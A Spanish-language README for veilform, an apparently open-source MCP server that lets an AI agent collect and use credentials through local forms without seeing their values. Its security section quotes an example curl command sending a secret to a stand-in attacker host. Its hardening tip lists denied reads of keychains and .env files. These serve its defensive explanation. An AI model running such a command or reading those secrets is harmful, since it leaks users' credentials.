<div align="center">

[English](README.md) · **Español**

<img src="docs/assets/hero-es.svg" width="100%" alt="Animación: el agente pide un token solo con metadatos, se abre un formulario local, escribes el secreto (se ven puntos), el valor va directo a .env, SSH, SQL o una API, y el agente solo recibe {stored:[&quot;MP_ACCESS_TOKEN&quot;]}.">

# veilform

**Que un agente de IA pida, guarde y use credenciales sin verlas jamás.**

[![CI](https://github.com/asteby/veilform/actions/workflows/ci.yml/badge.svg)](https://github.com/asteby/veilform/actions/workflows/ci.yml) [![Licencia: MIT](https://img.shields.io/badge/licencia-MIT-blue.svg)](LICENSE) [![Node ≥ 20.11](https://img.shields.io/badge/node-%E2%89%A5%2020.11-339933?logo=node.js&logoColor=white)](package.json) [![Servidor MCP](https://img.shields.io/badge/MCP-servidor%20stdio-6f42c1)](https://modelcontextprotocol.io)

[Modelo de amenazas](THREAT-MODEL.md) · [Política de seguridad](SECURITY.md) · [Cambios](CHANGELOG.md)

</div>

`veilform` es un servidor [MCP](https://modelcontextprotocol.io) de código abierto (stdio, TypeScript). El agente manda **solo metadatos** (el esquema de un formulario); tú escribes los valores en una página servida en `http://127.0.0.1`; van directo al destino que autorizaste. El agente recibe nombres y estados, nunca valores.

## Por qué

- **Un secreto pegado en el chat se queda en el chat.** Una vez en la conversación forma parte del contexto del modelo y de lo que guarde el cliente. veilform deja el valor en una página local, fuera de la conversación.
- **El agente necesita *usar* credenciales, no leerlas.** Escribe `${secret:NOMBRE}`; el servidor lo resuelve dentro de su propio proceso en el momento de usarlo, después de que apruebas la acción literal, y limpia la salida.
- **El trabajo real es más que una API key.** Listas de precios pegadas desde una hoja de cálculo, datos de clientes, llaves SSH para un servidor nuevo, un token que debe terminar en el `.env` de producción: todo con el mismo flujo y con auditoría.

**Sin veilform**

```text
Tú:     aquí está el token: APP_USR-4821-…-9f3c
Agente: ¡Gracias! Lo escribo en /etc/acme.env:
        MP_ACCESS_TOKEN=APP_USR-4821-…-9f3c

↳ el valor ya está en el contexto del modelo
  y en el historial de la conversación.
```

**Con veilform**

```text
Agente: secret_request({fields:[{name:"MP_ACCESS_TOKEN"}]})
        → se abre una página local; pegas ahí el token
Agente: ← {status:"completed", stored:["MP_ACCESS_TOKEN"]}
Agente: secret_write({name:"MP_ACCESS_TOKEN",
          target:{kind:"env-file", host:"prod-vps", …}})
        → apruebas la escritura exacta
Agente: ← {written:true, keys:[{key:"MP_ACCESS_TOKEN", action:"updated"}]}
```

## Cómo funciona

<img src="docs/assets/how-it-works-es.svg" width="100%" alt="Tres carriles. Lo que ve el modelo: secret_request con un esquema, nada mientras escribes, {stored:[nombres]}, ${secret:NOMBRE} y salida redactada. Lo que ves tú: la página local, el campo secreto, el destino, la aprobación de la acción literal. Lo que hace el servidor MCP: arma el formulario, recibe el valor, lo escribe en .env/SQL/SSH/API, lo resuelve al usarlo y limpia la salida. Los valores nunca cruzan la línea de vidrio hacia el carril del modelo.">

1. El modelo llama una herramienta solo con metadatos. Destinos, hosts, rutas, tablas y sitios deben estar en **tu** configuración (allowlist).
2. El enlace de un solo uso `http://127.0.0.1:<puerto>/p/<token de 256 bits>` te llega por **elicitation por URL de MCP** si el cliente la soporta (si no, se devuelve para que el cliente lo muestre, y se abre con `xdg-open`/`open` si `ui.openBrowser`). El primer navegador que lo abre lo amarra con una cookie HttpOnly; caduca en 10 min.
3. Llenas o apruebas. Token CSRF + verificación de Origin/Host + CSP estricta con nonce; nada de terceros; sin autocompletado.
4. Los valores van al destino desde este proceso (stdin/env, nunca argv; nunca en logs).
5. Las respuestas son estructurales; un filtro final elimina cualquier valor manejado y sus codificaciones.
6. Cada uso queda auditado (JSONL encadenado por hash). `veilform verify-audit` verifica la cadena.

## Capacidades

| | Capacidad | Herramientas | Lo que recibe el modelo |
|---|---|---|---|
| <img src="docs/assets/icons/form.svg" width="20" height="20" alt=""> | **Formularios ciegos** — secretos, o esquemas ricos: secciones, número/moneda/fecha/select/multiselect/booleano/archivo, `showIf`, tablas repetibles con CSV o pegado desde hoja de cálculo, vista previa | `secret_request`, `blind_input`, `blind_input_preview`, `secret_wait` | `{stored:[nombres]}`, `{rows_written, ids}`, errores `{field, code}` |
| <img src="docs/assets/icons/approve.svg" width="20" height="20" alt=""> | **Usar sin ver** — `exec` / `http` con `${secret:NOMBRE}`; la página de aprobación muestra la acción literal | `secret_use` | código de salida / estado HTTP + salida **redactada** |
| <img src="docs/assets/icons/capture.svg" width="20" height="20" alt=""> | **Captura web** — una ventana de Chromium propia del servidor; tú inicias sesión y el valor va del DOM al almacén | `web_capture`, `web_login` | `{stored:[nombre]}` o `{failed_step, error_code}` — nunca texto de la página |
| <img src="docs/assets/icons/key.svg" width="20" height="20" alt=""> | **Llaves SSH** — generar, instalar con contraseña de un solo uso, probar acceso, ejecutar comandos | `ssh_key_provision`, `ssh_exec` | huellas, prueba de acceso, salida redactada |
| <img src="docs/assets/icons/write.svg" width="20" height="20" alt=""> | **Escribir donde se necesita** — `.env` (local o por SSH), JSON/YAML, systemd, secretos de GitHub Actions, portapapeles; sinks de formularios a SQL (Postgres), APIs HTTP, archivos | `secret_write`, sinks de `blind_input` | `{written, target, keys:[{key, action}]}` |
| <img src="docs/assets/icons/stores.svg" width="20" height="20" alt=""> | **Almacenes** — llavero del sistema, archivo cifrado (AES-256-GCM), `.env`, archivo por SSH, Vault KV v2, Infisical, 1Password Connect, OPS | `secret_list`, `secret_delete`, `secret_rotate` | nombres + metadatos (creado, último uso, caducidad, rotación pendiente) |

## Cómo se ve

Capturas reales de las páginas locales, regeneradas con Playwright desde la UI de verdad (datos de ejemplo: “Acme Store”). Siguen el tema de tu GitHub.

<p align="center"><img src="docs/assets/flow-es.webp" width="760" alt="Grabación: el token se escribe como puntos, Guardar de forma segura, luego una página de aprobación para escribirlo en un .env, Aprobar."></p>

<table>
<tr>
<td width="50%" valign="top"><b>Formulario de secreto</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/es/form-dark.webp"><img src="docs/assets/shots/es/form-light.webp" width="100%" alt="Formulario: access token oculto, public key, selector de entorno, recuadro de destino y botón Guardar de forma segura."></picture></td>
<td width="50%" valign="top"><b>Tabla pegada desde una hoja de cálculo</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/es/table-dark.webp"><img src="docs/assets/shots/es/table-light.webp" width="100%" alt="Tabla repetible con cuatro filas de SKU y precio importadas desde filas pegadas."></picture></td>
</tr>
<tr>
<td valign="top"><b>La aprobación muestra el comando literal</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/es/approval-dark.webp"><img src="docs/assets/shots/es/approval-light.webp" width="100%" alt="Página de aprobación: secretos involucrados, cwd, huella, el comando curl exacto con ${secret:ACME_DEPLOY_TOKEN} y advertencias."></picture></td>
<td valign="top"><b>Confirmación de destino (upsert SQL, simulación)</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/es/destination-dark.webp"><img src="docs/assets/shots/es/destination-light.webp" width="100%" alt="A dónde van estos valores: base de datos, la sentencia INSERT … ON CONFLICT, el mapeo de columnas, dry run y la casilla de aprobación."></picture></td>
</tr>
<tr>
<td colspan="2" align="center"><b>Móvil</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/es/mobile-dark.webp"><img src="docs/assets/shots/es/mobile-light.webp" width="300" alt="El mismo formulario en una pantalla de teléfono."></picture></td>
</tr>
</table>

## Instalación en Claude Code

Requisitos: Node ≥ 20.11 y pnpm. Aún no está publicado en npm, así que se instala desde un clon:

```bash
git clone https://github.com/asteby/veilform && cd veilform
pnpm install && pnpm build
claude mcp add veilform -- node "$PWD/dist/cli.js"
```

Luego pídele al agente algo que requiera una credencial (“configura el token del proveedor de pagos en producción”) y abrirá la página local. Cuando esté publicado: `claude mcp add veilform -- npx -y veilform`.

<details>
<summary><b>Configuración y dependencias opcionales</b></summary>

- La configuración es una **allowlist**: copia [`examples/config.example.json`](examples/config.example.json) a `~/.config/veilform/config.json` y deja solo lo necesario. Sin archivo hay un único destino, `local` (llavero del SO). Verifícala con `veilform check-config`.
- En Linux el destino `keychain` usa `secret-tool` (paquete `libsecret-tools`); macOS usa `security`. Opcionales: `playwright-core` + Chromium (`web_capture`), `psql` (sinks SQL), `gh` (secretos de GitHub), OpenSSH.
- Variables: `VEILFORM_HOME` (por defecto `~/.config/veilform`), `VEILFORM_CONFIG`, `VEILFORM_AGENT` (etiqueta que se escribe en la auditoría).
- Endurecimiento recomendado en Claude Code (`.claude/settings.json`): niega a las herramientas propias del agente lo que este servidor protege, p. ej. `"deny": ["Read(~/.config/veilform/**)", "Bash(secret-tool:*)", "Bash(security:*)", "Read(**/.env)"]`.

</details>

## Ejemplos

**Llave de Stripe y una llamada:** `secret_request({title:"Stripe", fields:[{name:"STRIPE_KEY", label:"Llave secreta"}]})` → la pegas en la página local → `secret_use({action:"http", url:"https://api.stripe.com/v1/balance", headers:{Authorization:"Bearer ${secret:STRIPE_KEY}"}})` → la página de aprobación muestra exactamente esa petición → `{http_status:200, body:"…"}` (si la API repite la llave, sale como `[REDACTED:STRIPE_KEY]`).

**Token al `.env` de producción por SSH:** `secret_write({name:"MP_ACCESS_TOKEN", target:{kind:"env-file", host:"prod-vps", path:"/etc/myapp/myapp.env", key:"MP_ACCESS_TOKEN"}, dry_run:true})` → `{changes:[{key:"MP_ACCESS_TOKEN", action:"updated"}]}`. Sin `dry_run`, tras tu aprobación, cambia solo esa clave conservando comentarios y el resto, sube el archivo por stdin a un temporal, `chmod 0600`, `chown`/respaldo opcionales y `mv` atómico.

**Sacar un token de un panel web sin que el modelo lo vea:** `web_capture({site:"mercadopago", name:"MP_ACCESS_TOKEN", steps:[…], extract:{selector:"[data-testid=access-token]", regex:"(APP_USR-[\\w-]+)"}})`. Se abre una ventana de Chromium **propia del servidor**; **tú** inicias sesión (contraseña y 2FA nunca pasan por el modelo); puedes ajustar los pasos en la página de aprobación; el valor va del DOM al almacén.

**Llave SSH para un VPS nuevo:** `ssh_key_provision({host:"prod-vps", alias:"deploy_key", password:true})` → la página muestra la huella del host para compararla con tu proveedor, pide la contraseña de un solo uso, instala la llave pública y prueba el acceso. Luego `ssh_exec({host:"prod-vps", command:"systemctl restart myapp"})`.

**Precios USD en lote a Postgres:** `blind_input` con una tabla `rows:[sku, price(money USD)]` y sink `{type:"sql", database:"appdb", table:"public.product_prices", mode:"upsert", rows:"rows", columns:{…}, dry_run:true}`. Pegas las filas desde Excel/Sheets; los valores viajan como datos de `COPY … FROM STDIN` a una tabla temporal tipada y un `INSERT … SELECT` en una sola transacción (nunca como texto SQL).

**Datos sensibles de clientes:** `blind_input` con `nombre, email, rfc (pattern), teléfono` y sink `http` a tu CRM; el modelo solo recibe los ids creados.

## Seguridad

**Qué protege**

- Los valores nunca entran al contexto del modelo: las respuestas son estructurales (nombres, estados, conteos, ids, códigos de error) y un filtro final elimina cualquier valor manejado y sus codificaciones comunes. Pruebas de propiedades verifican que ni las respuestas, ni el JSON-RPC, ni la auditoría, ni stderr contengan el valor.
- Los valores nunca van en argv de los procesos que se lanzan (se usan stdin, env y FIFOs) ni en logs.
- La página local es de un solo uso, ligada a `127.0.0.1`, con CSRF, verificación de Origin/Host y defensa contra DNS rebinding, y CSP estricta; el texto que manda el modelo se pinta solo con `textContent`.
- Cada acción **nueva** (comando, petición HTTP, destino de escritura, sink, comando SSH, plan de captura) requiere un clic en una página que la muestra literal. “Recordar” se amarra a la huella exacta; cualquier cambio vuelve a preguntar.

**Qué no protege** (lee el [modelo de amenazas](THREAT-MODEL.md))

- Una acción **que tú apruebas** y que envía o transforma el valor (`curl https://atacante/?k=${secret:X}`). La aprobación muestra la acción literal y advierte sobre shells y herramientas de red/codificación, pero tú decides.
- Malware o un agente con shell sin restricciones corriendo con **tu usuario del sistema**: puede leer el llavero y los archivos que veilform escribe. Restringe las herramientas del agente (ver el endurecimiento arriba) o aíslalo.
- **Un navegador que el modelo sí ve** (extensión de navegador, Playwright MCP, computer use) abriendo una página que muestra un secreto. Usa `web_capture`, que solo devuelve estado.
- La redacción es heurística: valores muy cortos y codificaciones exóticas no se detectan. Las cadenas de JavaScript no se pueden borrar de memoria.

## Comparación con otros enfoques

Otras buenas herramientas atacan problemas cercanos; muchas veces se complementan en lugar de competir. Las descripciones se basan en la documentación pública de cada proyecto; revísala para el detalle actual.

| Enfoque | Qué resuelve bien | Dónde encaja veilform |
|---|---|---|
| **Gestores de contraseñas / 1Password** (`op run`, referencias `op://`, Connect) | Guardar y compartir secretos entre personas y equipos, políticas, rotación. 1Password ha [dicho públicamente](https://1password.com/blog/where-mcp-fits-and-where-it-doesnt) que no expondrá credenciales en crudo por MCP y prefiere inyectarlas a nombre del agente. | veilform puede usar **1Password Connect como destino**: escribes el valor en el formulario local y se guarda ahí de servidor a servidor. |
| **HashiCorp Vault / Infisical** | Almacén central con políticas de acceso, auditoría, leases y (en Vault) secretos dinámicos. | También son **destinos** (adaptadores `vault-kv2`, `infisical`). veilform agrega el paso humano de captura y la aprobación por acción cuando el agente los usa. |
| **Proxies de inyección y brokers** para agentes (p. ej. [OneCLI](https://github.com/onecli/onecli), [BlindKey](https://github.com/leocelis/blindkey)) | El agente usa marcadores y un gateway/broker pone la credencial real cuando sale la petición; muy adecuado para llamadas frecuentes a APIs. | Se enfoca en **meter** valores (formularios, tablas, captura web, llaves SSH) y **llevarlos a su lugar** (`.env` por SSH, SQL, secretos de GitHub), cada uno con aprobación literal. Un proxy puede atender las llamadas de alto volumen en paralelo. |

## Desarrollo

```bash
pnpm install
pnpm typecheck && pnpm lint && pnpm test
pnpm test:e2e
```

Visuales del README: `node scripts/readme-assets/make-svgs.mjs` (SVG animados e iconos) y `npx playwright test --config scripts/readme-assets/playwright.config.ts` (capturas y grabación desde la UI real; requiere ffmpeg con libwebp).

Desviaciones del diseño original (documentadas): el llavero usa los CLI del sistema en lugar de `@napi-rs/keyring`; `encrypted-file` usa AES-256-GCM + scrypt de Node en lugar de age/libsodium; las pruebas de propiedades usan un PRNG con semilla en lugar de `fast-check`. Las tres porque había que construir sin red con las dependencias en caché, y así las dependencias de ejecución son solo el SDK de MCP y zod.

## Licencia

[MIT](LICENSE)
